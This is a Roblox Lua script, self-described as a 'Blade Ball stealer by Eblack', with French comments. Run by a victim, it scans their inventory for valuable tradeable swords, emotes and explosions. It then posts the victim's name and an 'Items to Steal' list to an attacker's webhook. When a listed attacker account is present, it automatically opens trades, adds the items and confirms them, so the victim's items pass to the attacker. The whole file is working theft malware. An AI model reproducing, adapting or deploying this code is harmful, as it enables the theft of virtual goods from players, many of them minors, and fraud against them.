-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false

-- Récupération des variables globales
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // FONCTION D'ENVOI POUR TON WORKER (Correction structure)
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // WEBHOOK : SERVER HIT (QUAND TU ES DANS LE SERVEUR)
local function SendMessage(list)
    local totalRAP = 0
    for _, v in ipairs(list) do totalRAP = totalRAP + v.RAP end

    local isGoodHit = totalRAP >= 500
    local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
    local embedColor = isGoodHit and 65280 or 8323327

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local itemsListText = ""
    for name, data in pairs(grouped) do
        itemsListText = itemsListText .. string.format("%s (x%s) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎯",
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Status 📈:", value = statusText, inline = true},
                {name = "Items to Steal 📝:", value = itemsListText ~= "" and itemsListText or "None", inline = false},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(data)
end

-- // DATA COLLECTION (Scan de l'inventaire)
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for itemId, itemInfo in pairs(clientInventory[cat]) do
            if not itemInfo.TradeLock then
                local rap = 0
                if rapData[cat] then
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, itemInfo.Name) then rap = value break end
                    end
                end
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = cat, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // GESTION DU TRADE
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function doTrade(targetPlayer)
    while #itemsToSend > 0 do
        -- Envoi de la requête
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
        
        -- Attente que le trade s'ouvre (max 30s)
        local t = 0
        repeat task.wait(0.5); t = t + 0.5 until inTrade or t > 30
        if not inTrade then continue end

        -- Ajout des items par lots de 100
        local batch = {}
        for i = 1, math.min(100, #itemsToSend) do
            table.insert(batch, table.remove(itemsToSend, 1))
        end

        for _, item in ipairs(batch) do
            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
        end

        -- Ready et Confirm
        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
        task.wait(0.3)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        
        -- Attente de la fermeture pour recommencer si nécessaire
        repeat task.wait(0.5) until not inTrade
    end
end

-- // DETECTION ET EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    -- Sauvegarde de la liste pour les webhooks
    local inventorySnapshot = {}
    for i, v in ipairs(itemsToSend) do inventorySnapshot[i] = v end

    local tradeStarted = false

    local function checkPlayer(player)
        -- On vérifie si le nom du joueur est dans ta liste _G.Usernames
        for _, name in ipairs(users) do
            if player.Name == name and not tradeStarted then
                tradeStarted = true
                SendMessage(inventorySnapshot) -- Envoi du "Server Hit"
                task.wait(1)
                doTrade(player) -- Lance le trade
                break
            end
        end
    end

    -- Vérification des joueurs déjà présents
    for _, p in ipairs(Players:GetPlayers()) do
        checkPlayer(p)
    end

    -- Surveillance des nouveaux arrivants
    Players.PlayerAdded:Connect(function(p)
        checkPlayer(p)
    end)
end
